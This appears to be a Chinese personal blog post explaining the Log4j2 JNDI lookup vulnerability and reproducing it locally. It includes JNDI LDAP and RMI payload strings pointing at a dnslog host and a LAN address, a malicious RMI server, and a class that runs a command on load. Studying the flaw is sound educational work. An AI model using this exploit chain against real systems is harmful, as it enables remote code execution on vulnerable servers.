# log4j2漏洞原理简单学习


> 虽然我技术菜，也来晚了，但是我也在一点点进步，不是吗？



## 简述

**影响版本：**
 Apache Log4j 2.x<=2.15.0.rc1



**影响范围：**
 Spring-Boot-strater-log4j2Apache
 Struts2Apache
 SolrApache
 FlinkApache
 DruidElasticSearch
 Flume
 Dubbo
 Redis
 Logstash
 Kafka
 vmvare









## 漏洞原理

主要成因：log4j2提供的lookup功能



![lookup](http://image.xpshuai.cn/jndi_lookup.png)



日志中包含 `${}`,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。

log4j 2将基本的解析都做了实现：





常见解析：

```bash
${ctx:loginId}
${map:type}
${filename}
${date:MM-dd-yyyy}
${docker:containerId}${docker:containerName}
${docker:imageName}
${env:USER}
${event:Marker}
${mdc:UserId}
${java}
${jndi:logging/context-name}
${hostName}
${docker:containerId}
${k8s}
${log4j}
${main}
${name}
${marker}
${spring}
${sys:logPath}
${web:rootDir}
```



而其中的**JNDI**（Java Naming and Directory Interface, Java命名和目录接口）就是本次的主题了，t它提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器.......

也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：

`${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}`



其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA。













## SpringBoot集成log4j2













## 漏洞复现

### 1.新建Maven项目，导入依赖

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>MavenTest1</artifactId>
    <version>1.0-SNAPSHOT</version>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>17</source>
                    <target>17</target>
                    <compilerArgs>
                        <arg>--add-exports=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED</arg>
                    </compilerArgs>
                </configuration>
            </plugin>
        </plugins>
    </build>

    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version>
        </dependency>
    </dependencies>



    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

</project>
```



编写log4j2配置文件:

```yaml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">

<!--全局参数-->
<Properties>
<Property name="pattern">%d{yyyy-MM-dd HH:mm:ss,SSS} %5p %c{1}:%L - %m%n</Property>
<Property name="logDir">/data/logs/dust-server</Property>
</Properties>

<Loggers>
<Root level="INFO">
<AppenderRef ref="console"/>
<AppenderRef ref="rolling_file"/>
</Root>
</Loggers>

<Appenders>
<!-- 定义输出到控制台 -->
<Console name="console" target="SYSTEM_OUT" follow="true">
<!--控制台只输出level及以上级别的信息-->
<ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>
<PatternLayout>
<Pattern>${pattern}</Pattern>
</PatternLayout>
</Console>
<!-- 同一来源的Appender可以定义多个RollingFile，定义按天存储日志 -->
<RollingFile name="rolling_file"
fileName="${logDir}/dust-server.log"
filePattern="${logDir}/dust-server_%d{yyyy-MM-dd}.log">
<ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>
<PatternLayout>
<Pattern>${pattern}</Pattern>
</PatternLayout>
<Policies>
<TimeBasedTriggeringPolicy interval="1"/>
</Policies>
<!-- 日志保留策略，配置只保留七天 -->
<DefaultRolloverStrategy>
<Delete basePath="${logDir}/" maxDepth="1">
<IfFileName glob="dust-server_*.log" />
<IfLastModified age="7d" />
</Delete>
</DefaultRolloverStrategy>
</RollingFile>
</Appenders>
</Configuration>



```



### 2.新建Log4Test类：

这里模拟站点会记录用户登陆日志，实际上大部分网站确实会做相关功能

```java
package cn.xps.www;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Log4Test {
    private static final Logger logger = LogManager.getLogger(Log4Test.class);

    public static void main(String[] args) {
        // 避免因为Java版本过高而无法触发此漏洞
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

//        String username = "${jndi:rmi://192.168.43.161:8888/exp}";  // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
        String username = "${jndi:ldap://4fduwz.dnslog.cn}";  // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
        logger.error(username + "is login on ${java:os}");
    }

}

```



### 3.打开dnslog，发现成功获取ip

![](http://image.xpshuai.cn/log4_dnslog.png)





### 4.搭建RMI（Remote Method Invoke）服务

因为RMI比较容易搭建环境



#### 4.1 搭建 RMI 服务端，包含需要执行的恶意代码

RMI 服务端搭建，监听本地 8888（自定义）端口，用 Reference 类引用恶意对象

RMIServer.java

```java
package cn.xps.www;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(8888);
        System.out.println("Create RMI registry on port 8888");
        Reference reference = new Reference("cn.xps.www.Log4jRCE", "cn.xps.www.Log4jRCE", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("exp", referenceWrapper);
    }
}

```



这里java8和以上是有区别的，可以看这篇文章：

https://segmentfault.com/a/1190000041102850

https://segmentfault.com/q/1010000041102656



#### 4.2 恶意对象模拟执行 cmd 打开计算器，并且输出一个语句用于标记执行处:

Log4jRCE.java

```java
package cn.xps.www;

public class Log4jRCE {
    static {
        try {
            System.out.println("exec in here");
            String [] cmd={"Wireshark"};  //命令自己修改
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

```



#### 4.5 执行 RMIServer，创建 RMI 服务。



### 4.构建 EXP 触发目标服务器进行日志记录触发 JNDI 解析

Log4Test.java

```java
package cn.xps.www;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Log4Test {
    private static final Logger logger = LogManager.getLogger(Log4Test.class);

    public static void main(String[] args) {
        // 避免因为Java版本过高而无法触发此漏洞
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String username = "${jndi:rmi://192.168.43.161:8888/exp}";  // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
//        String username = "${jndi:ldap://4fduwz.dnslog.cn}";  // ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
        logger.error(username + "is login on ${java:os}");
    }

}

```



成功执行：

![](http://image.xpshuai.cn/wiershark_ok)





























## 参考

https://hackt0.github.io/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E6%90%AD%E5%BB%BARMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%8C%E5%8C%85%E5%90%AB%E9%9C%80%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81



https://segmentfault.com/a/1190000041102850

https://segmentfault.com/q/1010000041102656











---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/  

